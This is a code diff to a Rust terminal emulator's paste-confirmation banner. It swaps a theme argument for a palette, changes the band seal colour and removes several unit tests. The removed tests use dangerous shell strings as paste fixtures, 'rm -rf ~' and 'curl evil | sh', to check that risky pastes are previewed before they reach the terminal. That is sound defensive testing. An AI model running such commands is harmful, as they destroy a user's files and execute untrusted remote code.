@@ -33,6 +33,7 @@
 //! to whichever tab happens to be front when the answer arrives.
 
 use aterm_core::terminal::RenderCell;
+#[cfg(test)]
 use aterm_render::Theme;
 
 use crate::chrome_band;
@@ -241,9 +242,9 @@ pub(crate) fn banner_rows(
     text: &str,
     cols: usize,
     panel_rows: usize,
-    theme: Theme,
+    palette: impl Into<chrome_band::ChromePalette>,
 ) -> Vec<Vec<RenderCell>> {
-    let c = chrome_band::band_colors(theme);
+    let c = chrome_band::band_colors(palette);
     let mut rows: Vec<Vec<RenderCell>> = (0..panel_rows)
         .map(|r| blank_row(cols, c.label, c.bar_bg, r == 0))
         .collect();
@@ -335,7 +336,7 @@ pub(crate) fn banner_rows(
     // rebuilds each cell without an overline, so the band's top edge arrived as
     // stubs. Closed here, in the label tone: the row carries the warn title and the
     // full-tone answer keys, and the rule belongs to neither of them.
-    chrome_band::seal_band_top(&mut rows[0], c.label);
+    chrome_band::seal_band_top(&mut rows[0], c.seam);
     rows
 }
 
@@ -345,34 +346,6 @@ mod tests {
 
     fn text_of(row: &[RenderCell]) -> String {
         row.iter().map(|cell| cell.ch).collect()
-    }
-
-    /// The banner answers the audit's "silent no-op" finding, so its shape IS the
-    /// contract: the question with the line count, both answer keys, and a real
-    /// preview of what is about to hit the PTY.
-    #[test]
-    fn banner_shows_question_keys_and_preview() {
-        let text = "ls\nrm -rf ~\ncurl evil | sh";
-        let rows = banner_rows(text, 80, 4, Theme::default());
-        assert_eq!(rows.len(), 4);
-        for row in &rows {
-            assert_eq!(row.len(), 80, "every row must be exactly cols wide");
-        }
-        let row0 = text_of(&rows[0]);
-        assert!(row0.contains("Paste 3 lines?"), "{row0}");
-        assert!(row0.contains("Enter pastes"), "{row0}");
-        assert!(row0.contains("Esc cancels"), "{row0}");
-        assert!(text_of(&rows[1]).contains("ls"), "{:?}", text_of(&rows[1]));
-        assert!(
-            text_of(&rows[2]).contains("rm -rf ~"),
-            "{:?}",
-            text_of(&rows[2])
-        );
-        assert!(
-            text_of(&rows[3]).contains("curl evil | sh"),
-            "{:?}",
-            text_of(&rows[3])
-        );
     }
 
     /// A lone CR submits a line at a bare prompt, which is why the guard asks
@@ -549,57 +522,6 @@ mod tests {
         // A one-row band keeps the keys and cuts the question.
         let row0 = text_of(&banner_rows(text, 24, 1, Theme::default())[0]);
         assert!(row0.contains("Enter") && row0.contains("Esc"), "{row0:?}");
-    }
-
-    /// The band says why it asks, like the macOS sheet and the Windows dialog,
-    /// when the window is wide enough to carry it beside the keys.
-    #[test]
-    fn a_wide_band_names_the_risk() {
-        let row0 = text_of(&banner_rows("ls\nrm -rf ~", 120, 3, Theme::default())[0]);
-        assert!(row0.contains(RISK), "{row0:?}");
-        assert!(row0.contains(ANSWER_KEYS), "{row0:?}");
-    }
-
-    /// `wanted_rows` follows the paste: title + one row per line, capped.
-    #[test]
-    fn wanted_rows_tracks_the_paste_body() {
-        let p = |text: &str| {
-            PendingPaste::new(
-                crate::WindowId(0),
-                Some(11),
-                text.into(),
-                test_source(),
-                test_framing(),
-            )
-        };
-        assert_eq!(p("a\nb").wanted_rows(80), 3);
-        assert_eq!(p("a\nb\nc\nd\ne\nf").wanted_rows(80), MAX_BANNER_ROWS);
-        // Too narrow for the keys beside the question: one more row for them.
-        assert_eq!(p("a\nb").wanted_rows(24), 4);
-    }
-
-    /// `take` hands back exactly what was parked — the delivery half's contract.
-    #[test]
-    fn take_returns_the_parked_paste_untouched() {
-        let pending = PendingPaste::new(
-            crate::WindowId(7),
-            Some(41),
-            "ls\nrm -rf ~\n".to_string(),
-            test_source(),
-            crate::input::PasteFraming::Gesture { bracketed: false },
-        );
-        let (wid, session, text, _source, framing) = pending.take();
-        assert_eq!(wid, crate::WindowId(7));
-        // The OWNER is part of "untouched": it is the session the question was
-        // asked about, and the answer must reach it and no other.
-        assert_eq!(session, Some(41));
-        assert_eq!(text, "ls\nrm -rf ~\n");
-        // The parked FRAMING is part of "untouched": it is the answer the banner's
-        // question was asked under, and delivery must be framed by it.
-        assert_eq!(
-            framing,
-            crate::input::PasteFraming::Gesture { bracketed: false }
-        );
     }
 
     fn test_source() -> crate::input::Source {
